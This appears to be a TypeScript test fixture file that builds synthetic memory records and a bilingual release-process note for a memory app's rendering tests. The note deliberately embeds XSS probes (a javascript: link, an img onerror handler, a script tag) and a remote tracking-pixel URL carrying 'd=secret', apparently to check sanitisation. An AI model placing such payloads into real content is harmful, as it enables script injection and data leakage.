export type MemoryFixture = {
  id: string;
  bucket: string;
  content: string;
  tags: string[];
  createdAt: string;
  client: { name: string; version: string | null };
  principal: { kind: 'owner' } | { kind: 'machine'; id: string; name: string };
  workingDirectory: string | null;
};
export const memoryBuckets = [
  'me',
  'personal',
  'work',
  'work/acme',
  'work/acme/api',
];
export const memoryId = (n: number) =>
  `00000000-0000-4000-8000-${String(n).padStart(12, '0')}`;
export const releaseContent = `# Release process

Use the workflow, never create release tags or assets by hand. Esta guía se aplica a cada publicación del CLI.

## Before the release

- Confirm \`pnpm verify\` is green on \`main\`.
- Review the changelog and the pending migration plan with Luis.
- Check that the Cloudflare deployment uses the configured account and hostname.
- Ask for a second look when a persisted contract changes.

## Release sequence

1. Pull the green main branch.
2. Run the release workflow from GitHub Actions.
3. Record the result in the deployment notes.

\`\`\`bash
pnpm verify
# ${'long-command-line-'.repeat(35)}
\`\`\`

## Después del despliegue

- Verificar la pantalla inicial y la navegación entre buckets.
- Confirmar que remember aparece para el agente autorizado.

| Check | Expected result | Owner |
| --- | --- | --- |
| Web route | First screen renders | Luis |
| Memory MCP | Bucket grant enforced | Build box |

Release page: [Nook releases](https://github.com/taecontrol/nook/releases).
An imported note contains [unsafe link](javascript:alert(1)).
Raw HTML: <img src=x onerror=alert(1)> and <script>alert(1)</script>.
Remote image: ![status](https://tracker.example/pixel.png?d=secret).

${Array.from({ length: 8 }, (_, i) => `## Readiness review ${i + 1}\n\nConfirm the release commit, the migration plan, and the owner journey. Keep installation configuration outside the source. Revisar los permisos del bucket antes de publicar.\n`).join('\n')}`;
export function memoryFixture(
  n: number,
  overrides: Partial<MemoryFixture> = {},
): MemoryFixture {
  return {
    id: memoryId(n),
    bucket: 'work/acme',
    content: `# Deployment note ${n}\n\nConfirm CI before promoting the commit.`,
    tags: ['deploy'],
    createdAt: new Date(Date.UTC(2026, 9, 9, 14, 20 - n)).toISOString(),
    client: { name: 'claude-code', version: '2.1.295' },
    principal: { kind: 'machine', id: 'synthetic-mbp', name: 'luis-mbp' },
    workingDirectory: '/Users/luis/code/acme-api',
    ...overrides,
  };
}
export const typicalMemories = [
  memoryFixture(1, {
    content: releaseContent,
    tags: ['deploy', 'release-process', 'cli'],
  }),
  memoryFixture(2, {
    content: '# Acme API deployment\n\nDeploy staging before production.',
    client: { name: 'codex-mcp-client', version: '0.162.0' },
    principal: { kind: 'machine', id: 'synthetic-build', name: 'build-box' },
    workingDirectory: '/srv/build/acme-api',
  }),
  memoryFixture(3, {
    content:
      'Customer convention: use ACME-#### in commit descriptions and keep customer-facing notes free of internal hostnames.',
    createdAt: '2026-10-08T18:10:00.000Z',
    tags: ['conventions'],
  }),
  memoryFixture(4, {
    bucket: 'work',
    content:
      '# Write commit messages in English\n\nKeep the subject in the imperative mood.',
    client: { name: 'unknown', version: null },
    principal: { kind: 'owner' },
    workingDirectory: null,
  }),
  memoryFixture(5, {
    bucket: 'work',
    content:
      'For production deploys, wait for CI and review the exact commit that will be promoted.',
    createdAt: '2026-10-07T16:30:00.000Z',
  }),
  memoryFixture(6, {
    bucket: 'me',
    content: '# Prefer pnpm\n\nUse pnpm for installs and scripts.',
  }),
  memoryFixture(7, {
    bucket: 'me',
    content:
      'Before changing an architectural invariant, read the ADRs and record the new decision.',
    tags: [],
    createdAt: '2026-10-06T10:00:00.000Z',
    principal: { kind: 'owner' },
    workingDirectory: null,
  }),
];
export const tenTags = [
  'deploy',
  'release-process',
  'migration',
  'cloudflare',
  'acme',
  'web',
  'cli',
  'review',
  'health',
  'handoff',
];
export const manyMemories = Array.from({ length: 90 }, (_, i) =>
  memoryFixture(100 + i, {
    bucket: i < 60 ? 'work/acme' : i % 2 ? 'me' : 'work',
    content: `# Review the migration before promoting the API${i % 13 === 0 ? ' — check the release workflow, migration plan, and deployment notes before promoting the selected commit' : ''}\n\nDeployment note ${i}: verify the owner journey.`,
    tags: i % 11 === 0 ? tenTags : ['deploy'],
    createdAt: new Date(Date.UTC(2026, 9, 9, 14, 20 - i)).toISOString(),
  }),
);
